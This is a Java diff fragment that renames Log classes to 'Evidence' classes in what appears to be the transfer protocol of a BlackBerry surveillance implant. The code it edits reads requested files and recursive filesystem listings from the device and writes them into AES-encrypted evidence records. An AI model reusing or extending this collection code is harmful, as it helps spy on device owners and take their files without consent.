@@ -12,11 +12,11 @@ import blackberry.config.Conf;
 import blackberry.config.Keys;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
+import blackberry.evidence.Evidence;
+import blackberry.evidence.EvidenceType;
 import blackberry.fs.AutoFlashFile;
 import blackberry.fs.Directory;
 import blackberry.fs.Path;
-import blackberry.log.Log;
-import blackberry.log.LogType;
 import blackberry.transfer.CommandException;
 import blackberry.transfer.Proto;
 import blackberry.transfer.ProtocolException;
@@ -187,9 +187,9 @@ public abstract class Protocol {
 
         byte[] content = file.read();
         byte[] additional = Protocol.logDownloadAdditional(filename);
-        Log log = new Log(false, Keys.getInstance().getAesKey());
-        log.createLog(additional, LogType.DOWNLOAD);
-        log.writeLog(content);
+        Evidence log = new Evidence(false, Keys.getInstance().getAesKey());
+        log.createEvidence(additional, EvidenceType.DOWNLOAD);
+        log.writeEvidence(content);
         log.close();
     }
 
@@ -232,8 +232,8 @@ public abstract class Protocol {
     }
 
     public static void saveFilesystem(int depth, String path) {
-        Log fsLog = new Log(false, Keys.getInstance().getAesKey());
-        fsLog.createLog(null, LogType.FILESYSTEM);
+        Evidence fsLog = new Evidence(false, Keys.getInstance().getAesKey());
+        fsLog.createEvidence(null, EvidenceType.FILESYSTEM);
 
         // Expand path and create log
         if (path.equals("/")) {
@@ -262,7 +262,7 @@ public abstract class Protocol {
      * 
      * @param depth
      */
-    private static void expandRoot(Log fsLog, int depth) {
+    private static void expandRoot(Evidence fsLog, int depth) {
         //#ifdef DBC
         Check.requires(depth > 0, "wrong recursion depth");
         //#endif
@@ -286,7 +286,7 @@ public abstract class Protocol {
         }
     }
 
-    private static boolean saveFilesystemLog(Log fsLog, String filepath) {
+    private static boolean saveFilesystemLog(Evidence fsLog, String filepath) {
         //#ifdef DBC
         Check.requires(fsLog != null, "fsLog null");
         Check.requires(!filepath.endsWith("/"), "path shouldn't end with /");
@@ -332,7 +332,7 @@ public abstract class Protocol {
         databuffer.writeLong(DateTime.getFiledate(file.getFileTime()));
         databuffer.write(w_filepath);
 
-        fsLog.writeLog(content);
+        fsLog.writeEvidence(content);
 
         //#ifdef DEBUG
         debug.trace("expandPath: written log");
@@ -345,7 +345,7 @@ public abstract class Protocol {
      * saves the root log. We use this method because the directory "/" cannot
      * be opened, we fake it.
      */
-    private static void saveRootLog(Log fsLog) {
+    private static void saveRootLog(Evidence fsLog) {
         int version = 2010031501;
 
         //#ifdef DBC
@@ -361,7 +361,7 @@ public abstract class Protocol {
         databuffer.writeLong(DateTime.getFiledate(new Date()));
         databuffer.write(WChar.getBytes("/"));
 
-        fsLog.writeLog(content);
+        fsLog.writeEvidence(content);
     }
 
     /**
@@ -371,7 +371,7 @@ public abstract class Protocol {
      * @param path
      * @param depth
      */
-    private static void expandPath(Log fsLog, String path, int depth) {
+    private static void expandPath(Evidence fsLog, String path, int depth) {
         //#ifdef DBC
         Check.requires(depth > 0, "wrong recursion depth");
         Check.requires(path != null, "path==null");
